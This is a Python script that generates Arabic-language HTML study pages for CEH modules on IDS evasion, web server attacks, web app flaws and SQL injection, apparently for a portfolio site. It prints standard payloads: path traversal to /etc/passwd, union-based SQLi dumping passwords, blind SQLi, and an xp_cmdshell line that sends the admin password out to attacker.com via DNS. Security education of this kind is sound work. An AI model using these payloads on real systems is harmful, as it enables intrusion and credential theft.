import os

modules_dir = r"d:\abdo_portfolio\main\templates\main\modules"

# ================= MOD 12: EVASION =================
html_path_mod12 = os.path.join(modules_dir, "mod12_evasion.html")
content_mod12 = """
<!-- =======================================================
     CEH MODULE 12: EVADING IDS, FIREWALLS & HONEYPOTS
     ======================================================= -->
<div class="meth-content-view" id="meth-content-mod12" style="display:none;" dir="rtl">
  
  <div class="cyber-hero">
    <h2 class="hero-title"><span class="hero-icon">🥷</span> Evading IDS & Firewalls</h2>
    <p class="hero-tagline">تجاوز أنظمة كشف التسلل، جدران الحماية، ومصائد المغفلين (Honeypots).</p>
    <div class="hero-meta">
      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-green);"></span> Module 12</span>
      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-purple);"></span> Deep Dive</span>
    </div>
  </div>

  <div class="meth-section">
    <div class="section-header">
      <span class="section-icon">🛡️</span>
      <h3>تقنيات التجاوز المتقدمة (Evasion Techniques)</h3>
    </div>
    
    <div class="goal-cards-grid" dir="rtl">
      <div class="goal-card">
        <div class="goal-icon">🎭</div>
        <h4>IP Spoofing</h4>
        <div class="goal-subtitle">انتحال عنوان IP</div>
        <p>تعديل الـ Source IP في الحزمة لتبدو قادمة من مصدر موثوق داخل الشبكة (Internal Trusted IP) لتجاوز تصفية الجدار الناري.</p>
      </div>
      <div class="goal-card">
        <div class="goal-icon">🗺️</div>
        <h4>Source Routing</h4>
        <div class="goal-subtitle">توجيه المصدر</div>
        <p>تحديد المسار الدقيق (Route) للحزمة لتجاوز أجهزة הـ Firewall الموجودة في المسار الافتراضي.</p>
      </div>
      <div class="goal-card" style="border-color: #00e5a0;">
        <div class="goal-icon" style="color: #00e5a0;">🧩</div>
        <h4 style="color: #00e5a0;">Fragmentation</h4>
        <div class="goal-subtitle">تجزئة الحزم</div>
        <p>تقسيم الـ Packets إلى أجزاء صغيرة جداً (مثل Nmap -f) لمنع الـ IDS من تجميع الـ Payload وتحليله بسرعة.</p>
      </div>
      <div class="goal-card" style="border-color: #ff4757;">
        <div class="goal-icon" style="color: #ff4757;">🍯</div>
        <h4 style="color: #ff4757;">Honeypot Detection</h4>
        <div class="goal-subtitle">اكتشاف المصائد</div>
        <p>اكتشاف المصائد عبر فحص الاستجابات المثالية جداً، ملفات VMware، أو قياس التأخير الزمني (Latency) بسبب التسجيل المستمر.</p>
      </div>
    </div>
  </div>

</div>
"""

# ================= MOD 13: WEB SERVERS =================
html_path_mod13 = os.path.join(modules_dir, "mod13_web_servers.html")
content_mod13 = """
<!-- =======================================================
     CEH MODULE 13: HACKING WEB SERVERS
     ======================================================= -->
<div class="meth-content-view" id="meth-content-mod13" style="display:none;" dir="rtl">
  
  <div class="cyber-hero">
    <h2 class="hero-title"><span class="hero-icon">🖥️</span> Hacking Web Servers</h2>
    <p class="hero-tagline">استغلال ثغرات خوادم الويب: تجاوز المسار، والتهيئة الخاطئة.</p>
    <div class="hero-meta">
      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-blue);"></span> Module 13</span>
      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-purple);"></span> Deep Dive</span>
    </div>
  </div>

  <div class="meth-section">
    <div class="section-header">
      <span class="section-icon">⚙️</span>
      <h3>هجمات خوادم الويب (Web Server Attacks)</h3>
    </div>
    
    <div class="cyber-card" style="--tool-color: #ff4757;">
      <div class="card-header"><h4>1. تجاوز المسار (Directory Traversal)</h4></div>
      <p>استغلال ضعف التحقق من مدخلات المستخدم للوصول لملفات حيوية خارج הـ Web Root.</p>
      <div class="cmd-block">
        <div class="cmd-header"><span class="cmd-lang">Payload Examples</span></div>
        <pre><code># Linux Target
http://example.com/download.php?file=../../../../etc/passwd

# Windows Target
http://example.com/download.php?file=..\..\..\..\Windows\System32\cmd.exe</code></pre>
      </div>
    </div>

    <div class="cyber-card" style="--tool-color: #ffa502;">
      <div class="card-header"><h4>2. تقسيم استجابة HTTP (HTTP Response Splitting)</h4></div>
      <p>تمرير أحرف التحكم `\r` و `\n` داخل الـ Headers لخداع الخادم وتقسيم استجابته، مما يسمح باختطاف الجلسات أو Web Cache Poisoning.</p>
    </div>

    <div class="cyber-card" style="--tool-color: #00e5a0;">
      <div class="card-header"><h4>3. التهيئة الخاطئة (Server Misconfiguration)</h4></div>
      <p>ترك كلمات مرور افتراضية (Default Credentials)، تفعيل وظائف غير ضرورية، أو تمكين Verbose Error Messages التي تكشف معلومات حساسة.</p>
    </div>
  </div>

</div>
"""

# ================= MOD 14: WEB APPS =================
html_path_mod14 = os.path.join(modules_dir, "mod14_web_apps.html")
content_mod14 = """
<!-- =======================================================
     CEH MODULE 14: HACKING WEB APPLICATIONS
     ======================================================= -->
<div class="meth-content-view" id="meth-content-mod14" style="display:none;" dir="rtl">
  
  <div class="cyber-hero">
    <h2 class="hero-title"><span class="hero-icon">🌐</span> Hacking Web Applications</h2>
    <p class="hero-tagline">قائمة OWASP Top 10 وثغرات تطبيقات الويب الحرجة كـ XSS و SSRF.</p>
    <div class="hero-meta">
      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-orange);"></span> Module 14</span>
      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-purple);"></span> Deep Dive</span>
    </div>
  </div>

  <div class="meth-section">
    <div class="section-header">
      <span class="section-icon">🐞</span>
      <h3>الثغرات وتطبيقاتها (OWASP Top Vulnerabilities)</h3>
    </div>
    
    <div class="rd-compare-grid">
      <div class="rd-compare-col bad" style="border-color: #ff4757;">
        <div class="rd-compare-title">⚠️ Cross-Site Scripting (XSS)</div>
        <ul class="rd-compare-list">
          <li><strong>Reflected:</strong> الكود في الرابط وينعكس في الاستجابة.</li>
          <li><strong>Stored:</strong> الكود الخبيث مخزن دائم في قاعدة البيانات.</li>
          <li><strong>DOM-based:</strong> التلاعب بالـ Document Object Model بالمتصفح.</li>
        </ul>
      </div>
      <div class="rd-compare-col bad" style="border-color: #ffa502;">
        <div class="rd-compare-title">⚠️ CSRF & SSRF & IDOR</div>
        <ul class="rd-compare-list">
          <li><strong>CSRF:</strong> إجبار متصفح الضحية على تنفيذ إجراءات غير مرغوب فيها باستغلال جلسته.</li>
          <li><strong>IDOR:</strong> تغيير رقم `user_id` في الرابط للوصول لبيانات مستخدم آخر.</li>
          <li><strong>SSRF:</strong> إجبار الخادم على إجراء طلبات نيابة عن المهاجم للوصول لشبكات داخلية.</li>
        </ul>
      </div>
    </div>
  </div>

</div>
"""

# ================= MOD 15: SQL INJECTION =================
html_path_mod15 = os.path.join(modules_dir, "mod15_sqli.html")
content_mod15 = """
<!-- =======================================================
     CEH MODULE 15: SQL INJECTION
     ======================================================= -->
<div class="meth-content-view" id="meth-content-mod15" style="display:none;" dir="rtl">
  
  <div class="cyber-hero">
    <h2 class="hero-title"><span class="hero-icon">💉</span> SQL Injection (SQLi)</h2>
    <p class="hero-tagline">حقن قواعد البيانات واستخراج البيانات بطرق مباشرة، عمياء، أو خارج النطاق.</p>
    <div class="hero-meta">
      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-red);"></span> Module 15</span>
      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-purple);"></span> Deep Dive</span>
    </div>
  </div>

  <div class="meth-section">
    <div class="section-header">
      <span class="section-icon">🗄️</span>
      <h3>أنواع الحقن وأمثلة البايلودز (SQLi Payloads)</h3>
    </div>
    
    <div class="cyber-card" style="--tool-color: #00e5a0;">
      <div class="card-header"><h4>1. الحقن المرئي المباشر (In-band SQLi)</h4></div>
      <p>استخدام نفس القناة لاستقبال النتائج المباشرة.</p>
      <div class="cmd-block">
        <div class="cmd-header"><span class="cmd-lang">Error & Union Based</span></div>
        <pre><code># Error-based (إجبار تحويل نص لرقم لعرض الإصدار)
' OR 1=CONVERT(int, (SELECT @@version))--

# Union-based (دمج نتائج الاستعلام لسرقة الباسوردات)
' UNION SELECT username, password FROM users--</code></pre>
      </div>
    </div>

    <div class="cyber-card" style="--tool-color: #ffa502;">
      <div class="card-header"><h4>2. الحقن الاستدلالي (Blind SQLi)</h4></div>
      <p>لا تظهر أي نتائج، يُستدل على النتيجة بسؤال النظام صح/خطأ.</p>
      <div class="cmd-block">
        <div class="cmd-header"><span class="cmd-lang">Boolean & Time Based</span></div>
        <pre><code># Boolean-based (اختبار صحة شرط بولياني)
http://example.com/item?id=1 AND 1=1 (TRUE)

# Time-based (إجبار محرك القاعدة على التأخير الزمني - MySQL)
1' AND SLEEP(10)--</code></pre>
      </div>
    </div>

    <div class="cyber-card" style="--tool-color: #ff4757;">
      <div class="card-header"><h4>3. الحقن خارج النطاق (Out-of-band SQLi)</h4></div>
      <p>إجبار الخادم على إرسال البيانات المسروقة إلى خادم خارجي (DNS/HTTP) يسيطر عليه المهاجم.</p>
      <div class="cmd-block">
        <div class="cmd-header"><span class="cmd-lang">OOB Payload (MS SQL Server)</span></div>
        <pre><code>'; DECLARE @data varchar(255); 
SELECT @data=password FROM users WHERE username='admin'; 
EXEC master..xp_cmdshell 'ping ' + @data + '.attacker.com';--</code></pre>
      </div>
    </div>
  </div>

</div>
"""

# Write all files
for file_path, content in zip(
    [html_path_mod12, html_path_mod13, html_path_mod14, html_path_mod15],
    [content_mod12, content_mod13, content_mod14, content_mod15]
):
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(content)

print("Created Modules 12, 13, 14, 15 HTML files successfully.")
